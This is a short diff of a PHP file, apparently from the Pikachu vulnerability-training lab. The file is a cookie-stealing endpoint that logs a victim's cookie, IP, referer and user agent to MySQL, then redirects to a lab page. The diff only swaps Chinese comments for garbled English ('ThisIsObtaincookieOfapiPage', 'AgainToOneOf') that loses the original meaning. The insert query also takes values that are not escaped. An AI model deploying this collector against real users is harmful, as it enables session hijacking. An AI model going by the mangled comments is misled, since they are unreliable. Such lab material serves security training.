@@ -3,7 +3,7 @@ include_once '../inc/config.inc.php';
 include_once '../inc/mysql.inc.php';
 $link=connect();
 
-//这个是获取cookie的api页面
+//ThisIsObtaincookieOfapiPage
 
 if(isset($_GET['cookie'])){
     $time=date('Y-m-d g:i:s');
@@ -15,6 +15,6 @@ if(isset($_GET['cookie'])){
     values('$time','$ipaddress','$cookie','$referer','$useragent')";
     $result=mysqli_query($link, $query);
 }
-header("Location:http://192.168.1.4/pikachu/index.php");//重定向到一个可信的网站
+header("Location:http://192.168.1.4/pikachu/index.php");//AgainToOneOf
 
 ?>
